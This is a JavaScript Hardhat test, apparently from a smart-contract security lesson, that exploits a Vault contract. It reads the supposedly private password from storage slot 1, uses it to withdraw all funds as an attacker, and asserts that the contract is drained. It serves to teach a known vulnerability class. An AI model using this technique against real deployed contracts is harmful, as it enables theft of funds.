const { expect } = require("chai").use(require('chai-as-promised'));
const { ethers } = require("hardhat");

describe("Visibility of private state variable", function () {
    let deployer, attacker, vault

    beforeEach(async () => {
        [deployer, attacker] = await ethers.getSigners()

        const Vault = await ethers.getContractFactory('Vault')
        vault = await Vault.deploy(ethers.utils.formatBytes32String("myPassword"))
        await vault.deployed()
        await vault.deposit({ value: ethers.utils.parseEther('100') })

    })

    it("should be able to read private variable", async () => {
        let initialBalanceContract = await ethers.provider.getBalance(vault.address)
        let initialBalanceAttacker = await ethers.provider.getBalance(attacker.address)

        console.log("Contract's initial balance:", ethers.utils.formatEther(initialBalanceContract.toString()))
        console.log("Attacker's initial balance:", ethers.utils.formatEther(initialBalanceAttacker.toString()))

        // We're giving index 1 because Ownable storage _owner at 0 index
        let passwordBytes = await ethers.provider.getStorageAt(vault.address, 1)

        let password = await ethers.utils.parseBytes32String(passwordBytes)

        console.log("=========================")
        console.log("= Password:", password, " =")
        console.log("=========================")

        await vault.connect(attacker).withdraw(passwordBytes)

        let finalBalanceContract = await ethers.provider.getBalance(vault.address)
        let finalBalanceAttacker = await ethers.provider.getBalance(attacker.address)

        console.log("Contract's final balance:", ethers.utils.formatEther(finalBalanceContract.toString()))
        console.log("Attacker's final balance:", ethers.utils.formatEther(finalBalanceAttacker.toString()))

        expect(finalBalanceContract).to.eq(0)
        expect(finalBalanceAttacker).to.be.gt(initialBalanceAttacker)
        
    })
});
